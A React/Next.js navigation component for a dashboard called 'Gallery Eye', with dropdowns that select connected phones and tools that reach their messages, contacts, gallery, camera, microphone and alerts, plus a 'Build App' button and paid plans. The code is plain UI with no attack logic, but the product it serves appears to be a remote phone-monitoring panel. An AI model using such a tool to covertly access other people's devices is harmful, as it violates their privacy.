"use client";

import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
    MessageSquare, Users, Flashlight, Vibrate, 
    Camera, Bell, Mic, Smartphone, Settings, 
    LogOut, ChevronDown, Check, Zap, Crown, Image as ImageIcon, Package
} from 'lucide-react';
import Image from 'next/image';
import PlanBadge from './PlanBadge';

interface AppNavigationProps {
    devices: any[];
    selectedDeviceId: string | null;
    setSelectedDeviceId: (id: string) => void;
    selectedTool: string | null;
    setSelectedTool: (tool: string | null) => void;
    userPlan: 'basic' | 'standard' | 'premium';
    setShowPlansModal: (show: boolean) => void;
    handleSignOut: () => void;
    onOpenAppModal: () => void;
    onDeleteDevice: (deviceId: string) => void;
}

export default function AppNavigation({ 
    devices, selectedDeviceId, setSelectedDeviceId, selectedTool, setSelectedTool, 
    userPlan, setShowPlansModal, handleSignOut, onOpenAppModal, onDeleteDevice
}: AppNavigationProps) {
    const [openDropdown, setOpenDropdown] = useState<'tools' | 'devices' | 'profile' | null>(null);
    const navRef = useRef<HTMLDivElement>(null);

    const onlineDevices = devices.filter(d => d.online);
    const selectedDevice = devices.find(d => d.deviceId === selectedDeviceId);

    // Close dropdowns on click outside
    useEffect(() => {
        const handleClickOutside = (event: MouseEvent) => {
            if (navRef.current && !navRef.current.contains(event.target as Node)) {
                setOpenDropdown(null);
            }
        };
        document.addEventListener('mousedown', handleClickOutside);
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, []);

    const tools = [
        { id: 'gallery', label: 'Gallery', icon: ImageIcon, color: 'text-pink-400' },
        { id: 'sms', label: 'Messages', icon: MessageSquare, color: 'text-blue-400' },
        { id: 'contacts', label: 'Contacts', icon: Users, color: 'text-emerald-400' },
        { id: 'torch', label: 'Flashlight', icon: Flashlight, color: 'text-amber-400' },
        { id: 'vibration', label: 'Vibrate', icon: Vibrate, color: 'text-rose-400' },
        { id: 'camera', label: 'Camera', icon: Camera, color: 'text-cyan-400' },
        { id: 'audio', label: 'Microphone', icon: Mic, color: 'text-purple-400' },
        { id: 'notifications', label: 'Alerts', icon: Bell, color: 'text-indigo-400' },
    ];

    const currentToolData = tools.find(t => t.id === selectedTool);
    const ToolIcon = currentToolData?.icon || Zap;
    const toolLabel = currentToolData?.label || 'Tools';

    const toggleDropdown = (menu: 'tools' | 'devices' | 'profile') => {
        setOpenDropdown(openDropdown === menu ? null : menu);
    };

    const handleSelectTool = (toolId: string) => {
        setSelectedTool(toolId);
        setOpenDropdown(null);
    };

    const dropdownVariants = {
        hidden: { opacity: 0, y: -15, scale: 0.95 },
        visible: { opacity: 1, y: 0, scale: 1, transition: { type: 'spring' as const, stiffness: 400, damping: 30 } },
        exit: { opacity: 0, y: -15, scale: 0.95, transition: { duration: 0.2 } }
    };

    return (
        <div ref={navRef} className="fixed top-0 left-0 right-0 z-[100] px-4 py-3 md:px-8 pointer-events-none">
            <nav className="max-w-7xl mx-auto flex items-center justify-between glass-panel rounded-2xl p-2 px-4 shadow-neo pointer-events-auto">
                
                {/* Logo & Brand */}
                <div className="flex items-center gap-3">
                    <div className="w-10 h-10 neo-pressed rounded-xl flex items-center justify-center shadow-accent-glow relative overflow-hidden">
                        <img src="https://i.ibb.co/V0rWh957/logo-3-removebg-preview.png" alt="Logo" className="w-6 h-6 object-contain z-10" />
                        <div className="absolute inset-0 bg-accent/10 animate-pulse-soft" />
                    </div>
                    <span className="hidden md:block font-bold text-lg tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-white to-white/70">
                        Gallery Eye
                    </span>
                </div>

                {/* Navigation Items */}
                <div className="flex items-center gap-2 md:gap-3">
                    
                    {/* Tools Dropdown */}
                    <div className="relative">
                        <button 
                            onClick={() => toggleDropdown('tools')}
                            className={`flex items-center gap-2 px-3 md:px-4 py-2 rounded-xl transition-all duration-300 ${openDropdown === 'tools' || selectedTool ? 'neo-pressed text-accent' : 'neo-button text-fg-2 hover:text-fg-1'}`}
                        >
                            <ToolIcon className="w-5 h-5" />
                            <span className="hidden sm:block font-semibold text-sm">{toolLabel}</span>
                            <ChevronDown className={`w-4 h-4 transition-transform duration-300 ${openDropdown === 'tools' ? 'rotate-180' : ''}`} />
                        </button>

                        <AnimatePresence>
                            {openDropdown === 'tools' && (
                                <>
                                    {/* Backdrop */}
                                    <div className="fixed inset-0 z-[150]" onClick={() => setOpenDropdown(null)} />
                                    <motion.div
                                        variants={dropdownVariants}
                                        initial="hidden"
                                        animate="visible"
                                        exit="exit"
                                        className="fixed left-4 right-4 top-[75px] w-auto sm:absolute sm:top-[120%] sm:left-1/2 sm:right-auto sm:-translate-x-1/2 sm:mt-2 sm:w-[360px] p-5 glass-panel rounded-3xl shadow-neo-2xl border border-white/5 bg-[#0a0a0c]/95 z-[200] transform-gpu origin-top"
                                    >
                                        <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest mb-4 px-1">Select Tool</div>
                                        <div className="grid grid-cols-4 gap-3">
                                            {tools.map((tool) => (
                                                <button
                                                    key={tool.id}
                                                    onClick={() => handleSelectTool(tool.id)}
                                                    className="flex flex-col items-center justify-start gap-2 p-2 rounded-2xl hover:bg-white/5 active:scale-95 transition-all group"
                                                >
                                                    <div className={`w-14 h-14 rounded-2xl neo-surface flex items-center justify-center group-hover:shadow-[0_0_20px_rgba(255,255,255,0.05)] transition-all ${selectedTool === tool.id ? 'bg-white/5 ring-1 ring-accent/50 shadow-accent-glow' : ''}`}>
                                                        <div className={`p-2 rounded-xl bg-gradient-to-br from-white/10 to-transparent`}>
                                                            <tool.icon className={`w-5 h-5 ${tool.color} group-hover:scale-110 transition-transform`} strokeWidth={2.5} />
                                                        </div>
                                                    </div>
                                                    <span className="text-[10px] font-medium text-fg-2 group-hover:text-fg-1 text-center leading-tight">{tool.label}</span>
                                                </button>
                                            ))}
                                        </div>
                                    </motion.div>
                                </>
                            )}
                        </AnimatePresence>
                    </div>

                    {/* Devices Dropdown */}
                    <div className="relative">
                        <button 
                            onClick={() => toggleDropdown('devices')}
                            className={`flex items-center gap-2 px-3 md:px-4 py-2 rounded-xl transition-all duration-300 ${openDropdown === 'devices' ? 'neo-pressed text-accent' : 'neo-button text-fg-2 hover:text-fg-1'}`}
                        >
                            <Smartphone className="w-5 h-5" />
                            <span className="hidden sm:block font-semibold text-sm max-w-[100px] truncate">
                                {selectedDevice?.model || 'Devices'}
                            </span>
                            <ChevronDown className={`w-4 h-4 transition-transform duration-300 ${openDropdown === 'devices' ? 'rotate-180' : ''}`} />
                        </button>

                        <AnimatePresence>
                            {openDropdown === 'devices' && (
                                <>
                                    {/* Backdrop */}
                                    <div className="fixed inset-0 z-[150]" onClick={() => setOpenDropdown(null)} />
                                    <motion.div
                                        variants={dropdownVariants}
                                        initial="hidden"
                                        animate="visible"
                                        exit="exit"
                                        className="fixed left-4 right-4 top-[75px] w-auto sm:absolute sm:top-[120%] sm:left-1/2 sm:right-auto sm:-translate-x-1/2 sm:mt-2 sm:w-[340px] p-5 glass-panel rounded-3xl shadow-neo-2xl border border-white/5 bg-[#0a0a0c]/95 z-[200] transform-gpu origin-top"
                                    >
                                        <div className="flex flex-col gap-3">
                                            <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest px-1">Connected Devices</div>
                                            {devices.length === 0 ? (
                                                <div className="p-6 text-center text-fg-3 text-sm neo-surface rounded-2xl">No devices found in database</div>
                                            ) : (
                                                <div className="grid grid-cols-2 gap-3 max-h-[300px] overflow-y-auto pr-1 custom-scrollbar">
                                                    {devices.map(device => (
                                                        <div key={device.deviceId} className="relative group">
                                                            <button
                                                                onClick={() => { setSelectedDeviceId(device.deviceId); setOpenDropdown(null); }}
                                                                className={`w-full flex flex-col items-center justify-center gap-2 p-4 rounded-2xl transition-all active:scale-95 ${
                                                                    selectedDeviceId === device.deviceId ? 'bg-white/5 ring-1 ring-accent/50' : 'neo-surface hover:bg-white/5'
                                                                }`}
                                                            >
                                                                <div className="relative">
                                                                    <Smartphone className={`w-8 h-8 ${device.online ? 'text-emerald-400' : 'text-fg-4'}`} strokeWidth={1.5} />
                                                                    <div className={`absolute -bottom-1 -right-1 w-3 h-3 rounded-full border-2 border-[#18191c] ${device.online ? 'bg-emerald-500 shadow-[0_0_8px_#10b981]' : 'bg-red-500'}`} />
                                                                </div>
                                                                <span className="text-[11px] font-semibold text-fg-1 truncate w-full text-center">{device.model || 'Unknown'}</span>
                                                                <span className="text-[9px] text-fg-3 uppercase tracking-wider">{device.online ? 'Online' : 'Offline'}</span>
                                                            </button>
                                                            {!device.online && (
                                                                <button
                                                                    onClick={(e) => { e.stopPropagation(); onDeleteDevice(device.deviceId); }}
                                                                    className="absolute top-2 right-2 p-1.5 rounded-lg bg-red-500/10 text-red-400 opacity-0 group-hover:opacity-100 transition-opacity hover:bg-red-500/20"
                                                                    title="Delete Device"
                                                                >
                                                                    <svg className="w-3 h-3" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                                                                </button>
                                                            )}
                                                        </div>
                                                    ))}
                                                </div>
                                            )}
                                        </div>
                                    </motion.div>
                                </>
                            )}
                        </AnimatePresence>
                    </div>

                    <div className="w-px h-8 bg-white/10 mx-1 md:mx-2" />

                    {/* App Maker Button */}
                    <button 
                        onClick={onOpenAppModal}
                        className="flex items-center gap-2 px-3 md:px-4 py-2 rounded-xl neo-button text-accent hover:text-accent-hi transition-all"
                    >
                        <Package className="w-5 h-5" />
                        <span className="hidden sm:block font-bold text-sm">Build App</span>
                    </button>

                    {/* Profile Dropdown */}
                    <div className="relative">
                        <button 
                            onClick={() => toggleDropdown('profile')}
                            className={`flex items-center justify-center w-10 h-10 md:w-auto md:px-4 py-2 rounded-xl transition-all duration-300 ${openDropdown === 'profile' ? 'neo-pressed text-accent' : 'neo-button text-fg-2 hover:text-fg-1'}`}
                        >
                            <Settings className="w-5 h-5 md:mr-2" />
                            <span className="hidden md:block font-semibold text-sm">Account</span>
                        </button>

                        <AnimatePresence>
                            {openDropdown === 'profile' && (
                                <>
                                    <div className="fixed inset-0 z-[150]" onClick={() => setOpenDropdown(null)} />
                                    <motion.div
                                        variants={dropdownVariants}
                                        initial="hidden"
                                        animate="visible"
                                        exit="exit"
                                        className="fixed left-4 right-4 top-[75px] w-auto sm:absolute sm:top-[120%] sm:left-1/2 sm:right-auto sm:-translate-x-1/2 sm:mt-2 sm:w-[280px] p-5 glass-panel rounded-3xl shadow-neo-2xl border border-white/5 bg-[#0a0a0c]/95 z-[200] transform-gpu origin-top"
                                    >
                                        <div className="p-3 mb-2 rounded-xl neo-surface flex flex-col items-center text-center">
                                            <div className="w-12 h-12 rounded-full neo-pressed mb-2 flex items-center justify-center shadow-accent-glow">
                                                <span className="text-xl font-bold text-accent">GE</span>
                                            </div>
                                            <PlanBadge plan={userPlan} />
                                        </div>
                                        
                                        <div className="flex flex-col gap-2">
                                            <button 
                                                onClick={() => { setShowPlansModal(true); setOpenDropdown(null); }}
                                                className="flex items-center gap-3 p-3 rounded-xl neo-surface hover:neo-pressed transition-all text-accent group"
                                            >
                                                <Crown className="w-4 h-4 group-hover:scale-110 transition-transform" />
                                                <span className="text-sm font-bold">Upgrade Plan</span>
                                            </button>

                                            <button 
                                                onClick={() => { handleSignOut(); setOpenDropdown(null); }}
                                                className="flex items-center gap-3 p-3 rounded-xl neo-surface hover:neo-pressed transition-all text-danger group"
                                            >
                                                <LogOut className="w-4 h-4 group-hover:-translate-x-1 transition-transform" />
                                                <span className="text-sm font-bold">Sign Out</span>
                                            </button>
                                        </div>
                                    </motion.div>
                                </>
                            )}
                        </AnimatePresence>
                    </div>

                </div>
            </nav>
        </div>
    );
}
